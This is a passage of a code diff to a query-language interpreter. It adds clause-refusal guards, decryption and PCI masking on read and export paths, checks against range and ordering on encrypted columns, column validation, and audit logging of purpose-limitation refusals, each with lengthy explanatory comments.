             self._refuse_held_source_query(node.source, ctx, 'retrieve')
             db, _early = self._db_or_fail(ctx, 'retrieve', node)
             if db is None: return _early
-            table = self._resolve_source(node.source, ctx)
+            table, _src_col = self._resolve_source_parts(node.source, ctx)
         else:
             db = None
             table = None
+            # A held list has no table, so it has no column to narrow to. `_src_col` was set
+            # only on the database branch above, so every held-list query crashed here with
+            # UnboundLocalError the moment the column-projection step read it.
+            _src_col = None
             _held_name = node.source.parts[0]
 
         # Raw-SQL escape hatch, first-class inside the query block:
@@ -5911,6 +8523,26 @@ class MohioInterpreter:
                 spec.append(('or', [(f, self._eval_simple(v, ctx)) for f, v in b.pairs]))
             elif isinstance(b, NoMatchBlock):
                 spec.append(('not', [(f, self._eval_simple(v, ctx)) for f, v in b.pairs]))
+
+        # T1-RETRIEVE-CLAUSE-UNBUILT: the loop above consumes ONLY the four match forms. Every
+        # other clause reaching node.body -- `where`, `up to`, `order.*` -- was silently dropped,
+        # so `retrieve.all m from db.members / where role is "admin"` returned EVERY row: asked
+        # for admins, got the guests too. A dropped filter on a read is an authorization hole,
+        # and handing back an unfiltered table as though it were the filtered result is silent
+        # wrong data, so refuse rather than answer wrongly. This is the same treatment `pull`
+        # got for the identical bug (T1-PULL-FILTER-UNBUILT, 2026-08-24) -- retrieve was its
+        # unfixed sibling. Deferral, with its backlog entry; the grammar still accepts the form.
+        # Anything NOT explicitly consumed is refused, so a clause added later cannot quietly
+        # inherit the same hole.
+        _consumed = (MatchClause, MatchBlock, MatchAnyBlock, NoMatchBlock)
+        _dropped = [b for b in (node.body or []) if not isinstance(b, _consumed)]
+        if _dropped:
+            _names = ', '.join(sorted({self._clause_word(b) for b in _dropped}))
+            raise MohioRuntimeError(
+                f"retrieve: `{_names}` is declared but not yet built on `retrieve` -- the runtime "
+                f"fetches the rows without applying it, so returning them would hand back the "
+                f"WHOLE table as though it were the narrowed result. Use `find`, which applies "
+                f"these clauses, or narrow with `match <field> to <value>`.")
 
         # Top-level groups are ANDed: simple matches + AND-block = AND,
         # `match any` = OR within its group, `no.match` = NOT (none of these).
@@ -5948,7 +8580,8 @@ class MohioInterpreter:
             # scope, so this is safe to call unconditionally.
             if mod in ('all', 'every'):
                 self._audit_data_access('retrieve', _held_name, _rows, ctx)
-                return _bind_and_succeed(MohioValue(_rows, 'list'))
+                return _bind_and_succeed(
+                    MohioValue(self._project_column(_rows, _src_col), 'list'))
             if mod == 'count':
                 self._audit_data_access('retrieve', _held_name, _rows, ctx)
                 return _bind_and_succeed(MohioValue(len(_rows), 'number'))
@@ -5966,12 +8599,21 @@ class MohioInterpreter:
                     return _bind_and_succeed(MohioValue(None, 'null'))
                 row = _rows[0] if mod == 'first' else _rows[-1]
                 self._audit_data_access('retrieve', _held_name, row, ctx)
+                # T1-DOTTED-SOURCE-COLUMN: a column narrows a retrieve to that value, the
+                # same as it does for grab -- the two verbs differ in how they select, not in
+                # what a three-level source means.
+                if _src_col:
+                    return _bind_and_succeed(
+                        MohioValue(row.get(_src_col) if isinstance(row, dict) else None))
                 return _bind_and_succeed(MohioValue(row, 'shape'))
             if not spec:
                 return self._handle_failure(node.handlers, ctx, "retrieve: no match clause")
             if not _rows:
                 return _bind_and_succeed(MohioValue(None, 'null'))
             self._audit_data_access('retrieve', _held_name, _rows[0], ctx)
+            if _src_col:
+                return _bind_and_succeed(MohioValue(
+                    _rows[0].get(_src_col) if isinstance(_rows[0], dict) else None))
             return _bind_and_succeed(MohioValue(_rows[0], 'shape'))
 
         # ── multi-row: .all / .every -> collection (each-iterable), .count -> number ──
@@ -6003,14 +8645,31 @@ class MohioInterpreter:
         # is to give the CONDITION channel the same footing as the STATE channel: resolve the
         # value inside the try, dispatch handlers after it. Same shared mechanism, no parallel
         # path -- `_bind_and_succeed` is unchanged, it is only called one scope further out.
+        #
+        # BLIND INDEX: route any equality on an encrypted field through its shadow column.
+        # Translated ONCE here, so all four `retrieve` shapes (.all/.count/.first/.last/.one)
+        # below inherit it from the same line rather than each remembering to ask.
+        spec = self._bidx_spec(db, table, spec, node)
         try:
             if mod in ('all', 'every'):
                 rows = db.retrieve_all_spec(table, spec)
+                # Decrypt tagged fields on the way out -- the same call `.one` (below) and `find`
+                # already make. Without it the BULK read verbs handed back raw `enc:v1:...`, and
+                # `[pci]` masking made it worse rather than better: the mask ran on the ciphertext
+                # and produced `****loE=` -- the last four characters of the base64 blob, which
+                # LOOKS like a correctly masked card and is not. `.one` over the same row returned
+                # `****1111`. See T0-12 / matrix G5.
+                rows = [self._decrypt_row(r) for r in rows]
                 if self.verbose: print(f"  [retrieve.{mod}] {len(rows)} from {table}")
                 self._audit_data_access('retrieve', table, rows, ctx)
                 _result = MohioValue(rows, 'list')
             elif mod == 'count':
                 rows = db.retrieve_all_spec(table, spec)
+                # DELIBERATELY not decrypted (Rule 1 N/A-with-reason, not an oversight): `count`
+                # hands back `n`, never a row, so no tagged value can reach the program from here.
+                # `_audit_data_access` below reads the row KEYS to decide what was touched, never
+                # the values, so ciphertext does not affect it either. Decrypting every row of a
+                # table only to count them would be real work for no observable difference.
                 n = len(rows)
                 if self.verbose: print(f"  [retrieve.count] {n} in {table}")
                 self._audit_data_access('retrieve', table, rows, ctx)
@@ -6023,6 +8682,8 @@ class MohioInterpreter:
                     _result = MohioValue(None, 'null')
                 else:
                     row = rows[0] if mod == 'first' else rows[-1]
+                    # Decrypt the one row actually handed back (see the `all`/`every` branch).
+                    row = self._decrypt_row(row)
                     if self.verbose: print(f"  [retrieve.{mod}] from {table}")
                     self._audit_data_access('retrieve', table, row, ctx)
                     _result = MohioValue(row, 'shape')
@@ -6047,6 +8708,10 @@ class MohioInterpreter:
             return self._handle_failure(node.handlers, ctx, str(e), operational_failure=True)
         # Handlers run OUT here, on the same footing as `on.failure`: a `give back` in a branch
         # is control flow that leaves the block, and a nested verb's own error is its own.
+        # T1-DOTTED-SOURCE-COLUMN: a column narrows the retrieve to that value. Applied at the
+        # ONE db-path exit, so every modifier (.one / .first / .last / .all / .count) narrows the
+        # same way instead of each branch deciding for itself.
+        _result = self._narrow_result_to_column(_result, _src_col)
         return _bind_and_succeed(_result)
 
     def _write_export(self, rows, spec, ctx):
@@ -6060,7 +8725,17 @@ class MohioInterpreter:
         _dir = _os.path.dirname(target)
         if _dir:
             _os.makedirs(_dir, exist_ok=True)
-        data = [dict(r) for r in rows]
+        # Export is an EXIT PATH: the file leaves the building. It bypassed the display seam
+        # every other output goes through, so a `[pci]` field was written to the CSV/JSON as a
+        # full unmasked card number -- `pan,4111111111111111` in a column labelled `pan`. Route
+        # it through the SAME per-tag rule `give back` uses (`_apply_pci_mask`): `[pci]` exports
+        # masked, `[pii]` exports as its plaintext value exactly as `give back` hands it over,
+        # untagged is untouched. The `__bidx` shadow columns are already gone by here, stripped
+        # at the read seam.
+        #
+        # NOT decided here (Ronnie's fork): whether bulk export of tagged fields should also be
+        # AUDITED as egress, or require an explicit declaration. This only stops the raw leak.
+        data = [self._apply_pci_mask(dict(r)) for r in rows]
         if fmt == 'json':
             with open(target, 'w', encoding='utf-8') as f:
                 _json.dump(data, f, indent=2, default=str)
@@ -6123,10 +8798,17 @@ class MohioInterpreter:
             self._refuse_held_source_query(node.source, ctx, 'find')
             db, _early = self._db_or_fail(ctx, 'find', node)
             if db is None: return _early
-            table = self._resolve_source(node.source, ctx)
+            table, _src_col = self._resolve_source_parts(node.source, ctx)
         else:
             db = None
             table = None
+            # A held list has no table, so it has no column to narrow to. `_src_col` was set
+            # only on the database branch above, so every held-list query crashed here with
+            # UnboundLocalError the moment the column-projection step read it.
+            # A held list has no table, so it has no column to narrow to. `_src_col` was set
+            # only on the database branch above, so every held-list query crashed here with
+            # UnboundLocalError the moment the column-projection step read it.
+            _src_col = None
             _held_name = node.source.parts[0]
 
         from mohio_ast import MatchBlock, MatchAnyBlock, NoMatchBlock, TimespanRef
@@ -6138,6 +8820,13 @@ class MohioInterpreter:
         limit      = None
         order_by   = None
         order_dir  = 'asc'
+        # EVERY order clause, in the order written, most significant first. This used to be a
+        # single field and a single direction, so a second `order.` line silently overwrote the
+        # first and the primary key was discarded (measured 2026-09-02: `order.up by dept` then
+        # `order.down by name` sorted by name alone). Repeated `order.up` / `order.down` lines
+        # are the ruled form -- zero new vocabulary, and files that already carry two order
+        # lines start doing what their authors meant.
+        order_keys = []
         page_num   = None   # offset pagination
         cursor_val = None   # cursor pagination
         skip_offset = 0     # skip N — leading offset
@@ -6156,6 +8845,26 @@ class MohioInterpreter:
                     _s, _e = self._timeperiod_range(clause.value)
                     post_filters.append((field_name, 'time_in_range', _s.isoformat(), _e.isoformat()))
                 else:
+                    # A blind index answers EQUALITY only -- an HMAC preserves "same value",
+                    # never order. A range/contains comparison on an encrypted field would run
+                    # against ciphertext and quietly return the wrong rows (usually none), which
+                    # is the silent-wrong-answer shape this whole build exists to remove. Refuse.
+                    # OR THE COLUMN ACTUALLY HOLDS ENCRYPTED DATA. The declaration answers
+                    # what a column is for; the shadow index answers what is in it. A
+                    # classified value copied into an untagged column is sealed and indexed by
+                    # the write, so this comparison would run against ciphertext and quietly
+                    # return the wrong rows -- measured, an empty list over rows that hold the
+                    # value. The declared case has refused this for exactly that reason.
+                    if (self.classification.has(field_name, 'encrypted', table)
+                            or self._column_is_indexed(db, table, str(field_name).split('.')[-1])):
+                        raise _Raise(
+                            error_name='encrypted_field_not_rangeable',
+                            message=(f"'{field_name}' is an encrypted field, so it can only be "
+                                     f"matched for equality -- '{clause.condition}' compares "
+                                     f"order or content, which encryption does not preserve."),
+                            line=getattr(node, 'line', None),
+                            hint=(f"Use `where {field_name} is <value>`, or range on a "
+                                  f"non-encrypted column."))
                     v  = self._eval_filter_value(clause.value, ctx)
                     v2 = (self._eval_filter_value(clause.value2, ctx)
                           if getattr(clause, 'value2', None) is not None else None)
@@ -6196,8 +8905,33 @@ class MohioInterpreter:
                 # per this project's own "don't add checks for scenarios that can't happen."
                 limit = int(self._eval_simple(clause.count, ctx) or 0)
             elif isinstance(clause, OrderClause):
-                order_by  = clause.field
-                order_dir = 'asc' if clause.direction == 'up' else 'desc'
+                # SAME RULE AS A RANGE COMPARISON, and the message is deliberately the same one.
+                # A blind index preserves "same value", never order, so sorting an encrypted
+                # column sorts CIPHERTEXT -- measured: `order.up by name` over encrypted names
+                # returned bob before alice, which is not an error, not empty, and not right.
+                # The `where` path already refuses this for exactly this reason; ordering was the
+                # sibling nobody applied it to. Two paths, one property of encryption, one rule.
+                # Same widening as the range clause above, same reason: measured, ordering a
+                # column holding travelled ciphertext sorted the ciphertext and returned an
+                # order that is not the values' order, with no error.
+                if (self.classification.has(clause.field, 'encrypted', table)
+                        or self._column_is_indexed(db, table, str(clause.field).split('.')[-1])):
+                    raise _Raise(
+                        error_name='encrypted_field_not_rangeable',
+                        message=(f"'{clause.field}' is an encrypted field, so it can only be "
+                                 f"matched for equality -- ordering compares "
+                                 f"order or content, which encryption does not preserve."),
+                        line=getattr(node, 'line', None),
+                        hint=(f"Order on a non-encrypted column, or sort the rows after "
+                              f"reading them if the order really must follow "
+                              f"'{clause.field}'."))
+                _dir = 'asc' if clause.direction == 'up' else 'desc'
+                order_keys.append((clause.field, _dir))
+                # order_by / order_dir stay as the MOST SIGNIFICANT key: the SQL-side code
+                # reads them to decide whether it may keep a plain SQL LIMIT, and that
+                # decision only cares that an ordering exists at all.
+                if order_by is None:
+                    order_by, order_dir = clause.field, _dir
             elif isinstance(clause, ExportClause):
                 export_spec = clause
             elif hasattr(clause, '__class__') and 'Paginate' in clause.__class__.__name__:
@@ -6222,6 +8956,43 @@ class MohioInterpreter:
                 # variable fail-loud (T1-EVAL-SIMPLE-FAILLOUD) would now raise on that eval before
                 # the correct, specific cursor_pagination_unavailable ever got the chance to.
                 has_cursor = True
+
+        # T1-FIND-CLAUSE-UNBUILT (2026-08-31): the loop above consumes a KNOWN set. Anything
+        # else reaching node.body was silently DROPPED -- `find ... cache for 5 minutes`
+        # parsed, checked clean, cached nothing, and returned fresh rows, so a developer who
+        # wrote it believed database load was cut and it was not.
+        #
+        # `retrieve` already refuses its unconsumed clauses (T1-RETRIEVE-CLAUSE-UNBUILT) with
+        # the rule stated in its own comment: "Anything NOT explicitly consumed is refused, so
+        # a clause added later cannot quietly inherit the same hole." `find` never got that
+        # guard, so the SAME clause refused on one verb and lied on the other. This ports it,
+        # rather than special-casing the one word that happened to be noticed.
+        #
+        # CORRECTED 2026-09-01. The first version of this list named only the clauses consumed
+        # by the loop ABOVE, and missed the three consumed FURTHER DOWN this same method --
+        # calculate, summarize and the return clause. All three are real, working code
+        # (`_apply_calculate`, `_apply_summarize`, and the aggregate/projection branch), and
+        # the guard raised before any of them could run, so a guard written to stop silent
+        # drops turned three built features into "not yet built". A refusal that is wrong is
+        # not the safe direction: it is the same false statement pointing the other way.
+        # This list must name what the METHOD consumes, not what the loop consumes.
+        _find_consumed = (
+            'WhereClause', 'AndClause', 'TimespanRef', 'MatchClause', 'MatchBlock',
+            'MatchAnyBlock', 'NoMatchBlock', 'LimitClause', 'OrderClause', 'ExportClause',
+            'CalculateBlock', 'SummarizeBlock', 'ReturnClause',
+        )
+        _find_dropped = [b for b in (node.body or [])
+                         if type(b).__name__ not in _find_consumed
+                         and not any(k in type(b).__name__
+                                     for k in ('Paginate', 'Skip', 'Cursor', 'Sql'))]
+        if _find_dropped:
+            _names = ', '.join(sorted({self._clause_word(b) for b in _find_dropped}))
+            raise MohioRuntimeError(
+                f"find: `{_names}` is declared but not yet built on `find` -- the runtime "
+                f"returns the rows without applying it.\n"
+                f"    Returning them anyway would hand back a result that looks like it "
+                f"honoured the clause when it did not, so this refuses instead.\n"
+                f"    Remove the clause, or use a form that is built.")
 
         # Cursor (keyset) pagination is designed but not yet wired in the db
         # layer. Fail loud the moment it's used, before the query try-block, so
@@ -6262,13 +9033,16 @@ class MohioInterpreter:
                 if skip_offset: rows = rows[skip_offset:]
                 if limit: rows = rows[:limit]
         else:
+          # BLIND INDEX: equality on an encrypted field routes through its shadow column.
+          # Translated once, before any of the three db reads below use `where`.
+          where = self._bidx_dict(db, table, where, node)
           try:
             # ── Offset pagination ─────────────────────────────────
             if page_num is not None and limit:
                 offset     = skip_offset + (page_num - 1) * limit
                 rows       = db.find_many(table, where, limit=limit,
                                           order_by=order_by, order_dir=order_dir,
-                                          offset=offset)
+                                          offset=offset, order_keys=order_keys)
                 rows = [self._decrypt_row(r) for r in rows]
                 # COUNT query for total pages
                 total_count = db.count(table, where) if hasattr(db, 'count') else len(rows)
@@ -6294,7 +9068,8 @@ class MohioInterpreter:
                 rows = db.find_many(table, where,
                                     limit=(None if _blk else limit),
                                     order_by=order_by, order_dir=order_dir,
-                                    offset=(0 if _blk else skip_offset))
+                                    offset=(0 if _blk else skip_offset),
+                                    order_keys=order_keys)
                 rows = [self._decrypt_row(r) for r in rows]
                 page_meta = None
 
@@ -6323,6 +9098,29 @@ class MohioInterpreter:
                 f"'{table}' has no `{timespan_field}` field. Add a `{timespan_field}` timestamp "
                 f"column to that table (the explicit-field form `timespan NAME on <field>` is a "
                 f"planned follow-on).")
+
+        # ── MIOQL-3: the non-equality fields are validated too ──────────────────────────
+        # The EQUALITY half of a `where` lands in the `where` dict, which find_many passes to
+        # `_validate_fields`, so `where nosuchcol is "x"` has always failed loud. Everything
+        # else -- contains, starts.with, ends.with, is above, is below, is empty, is not --
+        # lands in `post_filters` and is applied in PYTHON by `_row_matches`, which was never
+        # validated. Measured 2026-09-03 on a bad column name:
+        #
+        #     is (equality)                     FAILS LOUD
+        #     contains / starts / ends          SILENT ZERO
+        #     is above / is below               SILENT ZERO
+        #     is empty / is not                 returned the WHOLE TABLE
+        #
+        # The last row is the worst of it: `_row_matches` reads a missing column as None, and
+        # None IS empty and IS not "x", so a typo turned a filter into "match everything". A
+        # silent zero is a wrong answer; a silent everything is a wrong answer that looks like
+        # a working query. Validated through the SAME `_validate_fields` the equality half
+        # already uses, so there is one rule and one message shape, not a second implementation.
+        if post_filters and db is not None and table:
+            _pf_fields = [f for (f, _c, _v, _v2) in post_filters if f]
+            _validate = getattr(db, '_validate_fields', None)
+            if _validate is not None and _pf_fields:
+                _validate(table, _pf_fields)
 
         # ── apply non-equality where conditions (above/below/between/contains/...) ──
         if post_filters and rows:
@@ -6359,6 +9157,11 @@ class MohioInterpreter:
                                          min(node.random_n, len(result_data)))
             rows = result_data
 
+        # Every aggregate clause is validated together, BEFORE any of them computes, so a bad
+        # column is reported as a bad column rather than as a number. See
+        # _validate_aggregate_columns for why this reads the schema and not the rows.
+        self._validate_aggregate_columns(db, table, node)
+
         # ── calculate: analytic/window columns added per row (rows preserved) ──
         calc = next((c for c in node.body if isinstance(c, CalculateBlock)), None)
         if calc is not None:
@@ -6392,7 +9195,11 @@ class MohioInterpreter:
                 rows = projected
                 result_data = rows
 
-        result = MohioValue(rows, 'list')
+        # T1-DOTTED-SOURCE-COLUMN: `find r in db.users.email` narrows the result to the
+        # EMAILS. Projected here, at the single binding point, AFTER every filter, sort,
+        # page and decryption step -- narrowing what is handed back must not change which
+        # rows were selected, or what a value is.
+        result = MohioValue(self._project_column(rows, _src_col), 'list')
 
         # Attach page metadata alongside — accessible as node.name.page.*
         # Store in context with special key for get_dotted to find
@@ -6682,9 +9489,12 @@ class MohioInterpreter:
                 end_dt   = end_dt.replace(tzinfo=row_dt.tzinfo)
             return start_dt <= row_dt < end_dt
         sval = str(value).strip('"') if value is not None else ''
-        if cond == 'contains':                    return raw is not None and sval in str(raw)
-        if cond in ('starts', 'starts_with'):     return raw is not None and str(raw).startswith(sval)
-        if cond in ('ends', 'ends_with'):         return raw is not None and str(raw).endswith(sval)
+        # The FOURTH implementation of these three operators, and the one a `where ... contains`
+        # in a find actually reaches. All four now share _text_predicate; fixing fewer would
+        # have left the search box case-sensitive on whichever path was missed.
+        if cond == 'contains':                    return raw is not None and _text_predicate('contains', raw, sval)
+        if cond in ('starts', 'starts_with'):     return raw is not None and _text_predicate('starts', raw, sval)
+        if cond in ('ends', 'ends_with'):         return raw is not None and _text_predicate('ends', raw, sval)
         if cond == 'is_not':                      return str(raw) != str(value)
         if cond == 'empty':                       return raw in (None, '', [])
         if cond == 'not_empty':                   return raw not in (None, '', [])
@@ -6698,6 +9508,74 @@ class MohioInterpreter:
             f"unknown filter condition '{cond}' on field '{field}' -- this `find`/`where` filter is "
             f"not recognized, so it cannot be applied and would otherwise match every row. Check "
             f"the condition word.")
+
+    # THE AGGREGATE VERBS, ENUMERATED ONCE. Written as data rather than as three checks in three
+    # places, because the last time this project added a clause-aware guard by hand the list was
+    # incomplete and three working clauses became false refusals. A clause that reduces or
+    # projects over a column belongs in this list, and the list is what the validator reads.
+    #
+    #   summarize   collapses rows      f.function, f.arg['source']
+    #   calculate   adds a column       f.function, f.arg['source']
+    #   return      binds a scalar      f['func'],  f['field']       (kind == 'agg')
+    #
+    # `count` IS validated, and that took a second look. It counts ROWS and ignores the field,
+    # so `nosuchcolumn.count` returns the row count: a plausible number for a column that does
+    # not exist, which is the same defect as the zero, not an exception to it. The reason to
+    # hesitate was the false-refusal trap, since `.count` on a RESULT SET is a common and
+    # correct form -- `activity_count recent_activity.count`, `total enrolled.count`. Both of
+    # those were checked and neither is inside a find body, so neither reaches this validator,
+    # which only ever walks a find's own aggregate clauses.
+    _AGGREGATE_CLAUSES = ('SummarizeBlock', 'CalculateBlock', 'ReturnClause')
+
+    @staticmethod
+    def _aggregate_source_columns(node):
+        """Every column an aggregate clause on this find will actually read.
+
+        Returns a sorted list, so the refusal reads the same way twice. Names are taken as the
+        LAST dotted segment, matching how `_compute_aggregate` looks the value up: `amount.sum`
+        over `db.sales` reads the column `amount`.
+        """
+        found = set()
+        for clause in (getattr(node, 'body', None) or []):
+            kind = type(clause).__name__
+            if kind in ('SummarizeBlock', 'CalculateBlock'):
+                for f in (getattr(clause, 'fields', None) or []):
+                    arg = getattr(f, 'arg', None)
+                    src = arg.get('source') if isinstance(arg, dict) else arg
+                    if src:
+                        found.add(str(src).split('.')[-1])
+            elif kind == 'ReturnClause':
+                for f in (getattr(clause, 'fields', None) or []):
+                    if not isinstance(f, dict) or f.get('kind') != 'agg':
+                        continue
+                    src = f.get('field')
+                    if src:
+                        found.add(str(src).split('.')[-1])
+        return sorted(found)
+
+    def _validate_aggregate_columns(self, db, table, node):
+        """An aggregate over a column that does not exist refuses, and names the real columns.
+
+        THE FOURTH INSTANCE OF ONE BUG, and the one that hides best. The equality and order
+        paths already refuse an unknown column (MIOQL-3); the aggregate path did not, and what
+        it returned instead was a NUMBER. Measured: `summarize / total nosuchcolumn.sum` over a
+        table holding real sales came back 0, and a report prints 0 as "no revenue". A wrong
+        number is worse than a missing one, because nothing downstream can tell it apart from a
+        real answer.
+
+        THE CASE THIS MUST NOT BREAK, and it is why the check is against the SCHEMA and not the
+        rows: a valid column over an empty result set is genuinely 0, and it has to stay 0. Read
+        from the data, the two are identical -- no values either way. Read from the table's
+        columns, they are never confusable. That distinction is the whole fix.
+
+        Rides the same `_validate_fields` floor the other paths use, so a new backend cannot
+        arrive with the aggregate half missing.
+        """
+        if db is None or not table:
+            return
+        columns = self._aggregate_source_columns(node)
+        if columns:
+            db._validate_fields(table, columns)
 
     def _compute_aggregate(self, func, field, rows):
         """Compute count/sum/average/max/min over a list of row dicts.
@@ -7569,7 +10447,7 @@ class MohioInterpreter:
             # not retrying costs audit records.
             for _attempt in range(12):
                 try:
-                    sink.ensure_table(log_name, _cac())
+                    _sink_call(sink.ensure_table, log_name, _cac(), allow_new_columns=True)
                     if _ready_logs is not None:
                         _ready_logs.add(log_name)
                     return
@@ -7586,7 +10464,7 @@ class MohioInterpreter:
                         MohioInterpreter._audit_rollback(sink)
                         import time as _t, random as _r
                         _t.sleep(min(0.15, 0.02 * (_attempt + 1)) * (0.5 + _r.random()))
-            sink.ensure_table(log_name, _cac())  # final attempt: let the real error surface
+            _sink_call(sink.ensure_table, log_name, _cac(), allow_new_columns=True)  # final attempt: let the real error surface
 
     @staticmethod
     def _ensure_chain_uniqueness(sink, log_name):
@@ -7600,12 +10478,29 @@ class MohioInterpreter:
         This is what makes multi-worker safe. Cheap, and idempotent, so it costs one statement per
         log per process.
         """
-        if not hasattr(MohioInterpreter, '_AUDIT_UX_DONE'):
-            MohioInterpreter._AUDIT_UX_DONE = set()
-        key = (id(sink), log_name)
-        if key in MohioInterpreter._AUDIT_UX_DONE:
+        # THE MEMO USED TO BE KEYED ON id(sink), IN A PROCESS-GLOBAL SET. CPython reuses an
+        # object's id() once that object is collected, so a NEW sink could land on a recycled
+        # id that was already marked done -- and the unique index that makes a chain fork
+        # physically impossible was then silently never created for it. Nothing said so; the
+        # protection simply was not there. That is the real cause of the intermittent
+        # `test_audit_hash_chain` failure recorded as an unreproducible "load flake" in run 3:
+        # it was never load, it was id reuse, and it appears or does not appear depending on
+        # what the garbage collector happened to do first (measured 2026-09-02 -- the same
+        # file, run twice in a row, failed both times standalone and passed inside a full
+        # suite run).
+        # The memo now lives ON THE SINK, so it is born and dies with the object it describes
+        # and no id can be recycled into it.
+        done = getattr(sink, '_audit_ux_done', None)
+        if done is None:
+            done = set()
+            # Deliberately NOT wrapped: a sink that cannot hold this attribute is a real
+            # problem worth seeing, and swallowing it would put the silence back in a different
+            # place. Every sink on this path is a DbRuntime, which the rollback helper below
+            # already reaches for by attribute.
+            sink._audit_ux_done = done
+        if log_name in done:
             return
-        MohioInterpreter._AUDIT_UX_DONE.add(key)
+        done.add(log_name)
         idx = f"ux_{log_name}_prev_hash"[:60]
         try:
             cur = sink.conn.cursor()
@@ -7644,7 +10539,10 @@ class MohioInterpreter:
             try:
                 from mohio_audit_grades import chained_write as _chained
                 with _chained():
-                    sink.save(log_name, row)
+                    # Audit rows are Mohio's OWN schema and legitimately grow a
+                    # column per event type -- the migration refusal is for a
+                    # user's write naming an unknown field, not for this.
+                    _sink_call(sink.save, log_name, row, allow_new_columns=True)
                 break
             except Exception as _e:
                 if 'unique' not in str(_e).lower() and 'duplicate' not in str(_e).lower():
@@ -7776,6 +10674,16 @@ class MohioInterpreter:
         traceable as ai.decide, not merely held in memory for the length of one run."""
         import hashlib as _hl, json as _json, datetime as _dt
         entry = dict(entry)
+        # THE REQUEST ID, carried on every audit record. Added to the entry (which is what
+        # `detail` serialises) rather than to CANONICAL_AUDIT_COLUMNS on purpose: a new column
+        # would mean a schema change for every existing audit table and would have to stay in
+        # step with the platform's pre-seed, while `detail` is already hash-chained, so the id
+        # is covered by the same tamper-evidence as the rest of the record. This is the third
+        # leg of the correlation -- the log line, the error payload and the audit row now carry
+        # ONE id for a request, instead of an error minting its own that matched nothing.
+        _rid = getattr(self, '_request_id', None)
+        if _rid and 'request_id' not in entry:
+            entry['request_id'] = _rid
         ts = _dt.datetime.utcnow().isoformat() + 'Z'
         entry['ts'] = ts
         entry['audit_id'] = _hl.sha256(
@@ -7928,8 +10836,8 @@ class MohioInterpreter:
         The alert sink's absence never suppresses the incident record.
         """
         import uuid as _uuid, datetime as _dt, json as _json, sys as _sys
-        frameworks = getattr(ctx, '_sector_compliance', None) if ctx is not None else None
-        sector = getattr(ctx, '_sector', None) if ctx is not None else None
+        frameworks = scoped_attr(ctx, '_sector_compliance')
+        sector = scoped_attr(ctx, '_sector')
         session_id, member_id = self._audit_actor(ctx)
         incident = {
             'incident_id':             str(_uuid.uuid4()),
@@ -7997,7 +10905,7 @@ class MohioInterpreter:
         """
         try:
             from mohio_audit_grades import required_grade as _rg
-            frameworks = getattr(ctx, '_sector_compliance', None) if ctx is not None else None
+            frameworks = scoped_attr(ctx, '_sector_compliance')
             grade, unknown = _rg(frameworks)
             if unknown:
                 import sys as _sys
@@ -8088,6 +10996,13 @@ class MohioInterpreter:
             allowed = self._field_purposes.get(fld, set())
             if asserted not in allowed:
                 allowed_str = "', '".join(sorted(allowed)) if allowed else '(no purpose)'
+                # WHAT WAS PREVENTED IS THE COMPLIANCE CLAIM. Purpose limitation cites GDPR
+                # Art. 5(1)(b) in its own refusal message, and the refusal left no trail: after
+                # the fact, a control that FIRED was indistinguishable from one that was never
+                # tested. The permitted use already audits (`_audit_purpose_use` writes
+                # PURPOSE_USE), so the trail recorded every allowed use and none of the stops,
+                # which is the half a regulator asks about.
+                self._audit_purpose_violation(fld, asserted, allowed, ctx, 'direct')
                 raise MohioRuntimeError(
                     f"'{fld}' was collected for purpose '{allowed_str}'. Using it under "
                     f"purpose '{asserted}' violates purpose limitation (GDPR Art. 5(1)(b)). "
@@ -8105,12 +11020,43 @@ class MohioInterpreter:
         asserted = self._purpose_scope[-1]
         if asserted not in purposes:
             allowed_str = "', '".join(sorted(purposes))
+            # THE SIBLING SITE. A value COPIED from a [pii] field carries the field's purposes,
+            # and refusing it here is the same control refusing on a derived value. Auditing one
+            # of the two and not the other would make the trail depend on how the program
+            # happened to be written.
+            for _fld in sorted(getattr(val, '_purpose_fields', None) or {'(derived)'}):
+                self._audit_purpose_violation(_fld, asserted, purposes, ctx, 'derived')
             raise MohioRuntimeError(
                 f"a value collected for purpose '{allowed_str}' is being used under purpose "
                 f"'{asserted}', which violates purpose limitation (GDPR Art. 5(1)(b)). Use a "
                 f"value collected for '{asserted}', or record consent for it.")
         for fld in sorted(getattr(val, '_purpose_fields', None) or {'(derived)'}):
             self._audit_purpose_use(fld, asserted, purposes, ctx)
+
+    def _audit_purpose_violation(self, field, asserted, allowed, ctx, use_kind):
+        """Record a purpose-limitation REFUSAL, to the same log role denial writes to.
+
+        The trail has to answer two different questions and it only answered one. `PURPOSE_USE`
+        records what was allowed; nothing recorded what was stopped, so purpose limitation could
+        not be shown to have worked at all. Written through `_audit_event`, so it is stamped and
+        hash-chained exactly like the access_denied rows beside it, and appended to
+        `security_audit_log` for the same reason: a control refusing is the same kind of event
+        whether the control is a role or a purpose.
+
+        Records the FIELD, the purpose ATTEMPTED and the purposes ALLOWED, because "a purpose
+        violation happened" is not evidence of anything. What was prevented, and why, is.
+        """
+        _evt = self._audit_event('security_audit_log', {
+            'event': 'purpose_violation',
+            'reason': 'purpose_not_permitted',
+            'field': str(field),
+            'attempted_purpose': str(asserted),
+            'allowed_purposes': sorted(str(a) for a in (allowed or ())),
+            # 'direct' is the field itself. 'derived' is a value copied from it, which
+            # carries the field's purposes and is refused by the sibling site.
+            'use': use_kind,
+        }, ctx)
+        self._audit_logs.setdefault('security_audit_log', []).append(_evt)
 
     def _audit_purpose_use(self, field, asserted, allowed, ctx):
         """Log an ALLOWED [pii] use under a declared purpose to the same durable,
@@ -8140,9 +11086,9 @@ class MohioInterpreter:
         only, never values; the row count, the actor, and the time. The tag carries this on
         its own, sector or not; a sector adds the certified claim and org-wide breadth, it is
         not what turns the access log on. No tagged field in the result, no entry."""
-        phi_set = self._phi_fields or set()
-        pci_set = self._pci_fields or set()
-        pii_set = self._pii_fields or set()
+        phi_set = set(self.classification.fields_with('phi'))
+        pci_set = set(self.classification.fields_with('pci'))
+        pii_set = set(self.classification.fields_with('pii'))
         if not phi_set and not pci_set and not pii_set:
             return None
         row_list = rows if isinstance(rows, list) else ([rows] if rows else [])
@@ -8242,7 +11188,7 @@ class MohioInterpreter:
         if not values:
             # update/remove know the SHAPE of the identity without holding a whole row.
             return None, 'composite(' + ','.join(ident) + ')'
-        tagged = getattr(self, '_encrypted_fields', set()) or set()
+        tagged = set(self.classification.fields_with('encrypted'))
         shape = 'composite(' + ','.join(ident) + ')'
         parts = []
         for col in ident:
@@ -8280,10 +11226,11 @@ class MohioInterpreter:
         active sector there is no automatic data audit (the developer can still
         audit explicitly). This is what makes a sector profile's promise to log
         data writes true at runtime, not merely declared on paper."""
-        fields_tagged = bool(fields and self._encrypted_fields
